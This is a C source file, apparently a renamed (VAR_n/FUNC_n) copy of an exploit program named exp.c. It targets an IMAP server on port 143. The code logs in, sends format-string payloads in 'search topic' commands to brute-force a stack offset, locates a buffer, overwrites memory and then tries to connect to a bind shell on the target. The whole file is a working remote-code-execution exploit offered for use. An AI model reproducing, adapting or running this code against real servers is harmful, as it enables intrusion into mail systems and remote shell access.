
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


typedef unsigned int u_int ;
struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {unsigned short sin_port; int sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (char*) ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_1 (scalar_t__) ;
 int FUNC_2 (int ,unsigned int,int,int) ;
 int FUNC_3 (char*) ;
 int FUNC_4 (int) ;
 char* VAR_7 ;
 scalar_t__ FUNC_5 (char*,struct sockaddr_in) ;
 scalar_t__ FUNC_6 (int,struct sockaddr*,int) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (int ,char*,...) ;
 int FUNC_9 (char*) ;
 struct hostent* FUNC_10 (char*) ;
 int FUNC_11 (int,char**,char*) ;
 int VAR_8 ;
 scalar_t__ FUNC_12 (int) ;
 int FUNC_13 (char*) ;
 scalar_t__ FUNC_14 (TYPE_1__) ;
 char* FUNC_15 (int) ;
 int FUNC_16 (TYPE_1__*,int ,int ) ;
 scalar_t__ VAR_9 ;
 scalar_t__ FUNC_17 (int,char*,int) ;
 int FUNC_18 (int,char*,...) ;
 int FUNC_19 (int) ;
 int FUNC_20 (int ,int ,int ) ;
 int VAR_10 ;
 int VAR_11 ;
 scalar_t__ FUNC_21 (char*,int) ;
 scalar_t__ FUNC_22 (scalar_t__) ;
 int FUNC_23 (char*) ;
 scalar_t__ FUNC_24 (char*,char*,int) ;
 char* FUNC_25 (char*,char*) ;
 int FUNC_26 (int,char**) ;
 int FUNC_27 () ;

int FUNC_28( int VAR_12, char **VAR_13 )
{
  struct hostent *VAR_14;
  struct sockaddr_in VAR_15;
  char VAR_16[1030];
  char *VAR_17, VAR_18[512], *VAR_19, *VAR_20, *VAR_21, *VAR_22;
  int VAR_23, VAR_24 = 0, VAR_25, VAR_26 = 1;
  int VAR_27 = 0, VAR_28, VAR_29 = 0;
  int VAR_30 = 0, VAR_31 = 0, VAR_32;
  int VAR_33 = 0;
  unsigned int VAR_34 = (u_int)0x0806c000;

  FUNC_27( );

  if ( VAR_12 < 9 )
  {
    FUNC_26(VAR_12, VAR_13);
    FUNC_7(VAR_3);
  }

  if (!(VAR_17 = FUNC_15 (128)))
  {
    FUNC_8(VAR_10, "exp.c:115 Could not allocate memory\n");
    FUNC_7(VAR_2);
  }


  while((VAR_23 = FUNC_11(VAR_12, VAR_13, "h:p:l:a:")) != VAR_1)
  {
   switch(VAR_23)
   {
      case 'h':
      VAR_17 = (char *)FUNC_22(VAR_9);
      break;

      case 'V':
      break;

      case 'p':
      VAR_24 = FUNC_1 (VAR_9);
      break;

      case 'l':
      VAR_21 = (char *)VAR_9;
      break;

      case 'a':
      VAR_22 = (char *)VAR_9;
      break;

      default:
      FUNC_26(VAR_12, VAR_13);
      break;
 }
}



  if ((VAR_25 = FUNC_20(VAR_5, VAR_6, VAR_4)) < 0)
  {
    FUNC_8(VAR_10, "exp.c:139 Error creating an new socket");
    FUNC_7(VAR_2);
  }

  VAR_17 = (VAR_17) ? VAR_17 : "localhost";
  VAR_24 = (VAR_24) ? VAR_24 : 143;

  if (!(FUNC_0(VAR_17)))
  {
     if (!(VAR_14 = FUNC_10(VAR_17)))
     {
       FUNC_8(VAR_10, "exp.c:152 Could not resolve ip address\n");
       FUNC_7(VAR_2);
     }

     FUNC_16(&VAR_15,VAR_14->h_addr,VAR_14->h_length);
     VAR_17 = (char *)FUNC_22(FUNC_14(VAR_15));
  } else
    VAR_15 = FUNC_13(VAR_17);




  VAR_15 = VAR_0;
  VAR_15 = (unsigned short)FUNC_12( VAR_24 );

  FUNC_8(VAR_11, "[+] Connecting to %s:%d\n", VAR_17,VAR_24);

  if ((FUNC_6(VAR_25, (struct sockaddr *)&VAR_15,sizeof(struct sockaddr))) < 0)
  {
     FUNC_8(VAR_10, "[*] exp.c:178 Connection failed\n");
     FUNC_7(VAR_2);
  }


  FUNC_8(VAR_11, "[+] Connected .. \n");
  FUNC_8(VAR_11, "[+] Sending login ... \n");

  FUNC_18(VAR_25, "1 LOGIN %s %s\r\n", VAR_21, VAR_22);
  FUNC_8(VAR_11, "[+] Done ... \n");

  while ((FUNC_17(VAR_25, VAR_18, 512)) > 0)
  {
    if ( VAR_27 == 0 && VAR_30 == 0)
    switch (VAR_18[0])
    {

     case '1':
     FUNC_8(VAR_11, "[+] Selecting inbox ..\n");
     FUNC_18(VAR_25, "2 Select inbox\n");
     FUNC_8(VAR_11, "[+] Selecting Done .. Starting brute sequence\n");
     FUNC_18(VAR_25, "3 search topic .AAAABBBB%%%d$x\n",VAR_26);
     VAR_27 = 1;
     break;
    }


    if ((VAR_19=FUNC_25(VAR_18, "(near")) && VAR_27 == 1)
    {
      VAR_19 +=15;
      if ((FUNC_24(VAR_19, "41414141",8))!=0)
      {
        VAR_26 ++;
        FUNC_18(VAR_25, "3 search topic .AAAABBBB%%%d$x\n",VAR_26);
      }
      else
      {
        FUNC_8(VAR_11, "[+] Found offset %d\n", VAR_26);
 FUNC_8(VAR_11, "[+] Finding buffer on the stack\n");
 VAR_30 = 1;
 VAR_27 = 0;
        FUNC_3(VAR_18);
      }
    }

    if ( VAR_30 == 1 )
    {

      if ((VAR_19=FUNC_25(VAR_18, "(near")))
      {
        VAR_19 +=6+4 +1;

 VAR_29 = FUNC_23(VAR_18) - FUNC_23(VAR_19);
 VAR_29 -=6+4+1;

 for (VAR_28 = 0; VAR_28 < FUNC_23(VAR_18); VAR_28++)
        {
           if ( (FUNC_24(VAR_19, VAR_7, FUNC_23(VAR_7)))==0 && VAR_33 !=1)
           {
      VAR_34 += VAR_28 -4;
      VAR_33 = 1;
      FUNC_19(2);
             FUNC_2(VAR_8, VAR_34+=3, VAR_26, VAR_25);
             FUNC_8(VAR_11,"[+] Decoy found at %u\n", VAR_34);
             FUNC_4(VAR_25);
      FUNC_8(VAR_11, "[+] Trying to contact the bind shell ..\n");
          if((FUNC_5(VAR_17, VAR_15)) < 0)
        FUNC_8(VAR_10, "[-] Exploit failed\n");
           }
           else
             ++VAR_19;
        }
      }
      if( VAR_34 > 0xc0000000)
        break;
      VAR_34++;
      VAR_19 = ((char *)&VAR_34);
      VAR_19[4] = 0;
      if ( FUNC_21(VAR_19, 0xa) || FUNC_21(VAR_19, 0xd) || VAR_19[0]==0x00)
      {
        VAR_34 ++;
        VAR_19 = ((char *)&VAR_34);
        VAR_19[4] = 0;
      }
      while (FUNC_23(VAR_19) !=4)
      {
        VAR_34++;
        VAR_19 = ((char *)&VAR_34);
        VAR_19[4] = 0;
      }
      if (VAR_33 != 1)
      {
        FUNC_18(VAR_25, "3 search topic .%s....%%%d$s%sCCCC\n",VAR_19,VAR_26,VAR_7);
      }
    }
    FUNC_3(VAR_18);
  }

  FUNC_8(VAR_10, "[+] Closing connection\n");
  FUNC_4(VAR_25);
  FUNC_9(VAR_17);

  FUNC_8(VAR_10, "[-] Exploit failed %u\n", VAR_34);
  return 0;
}
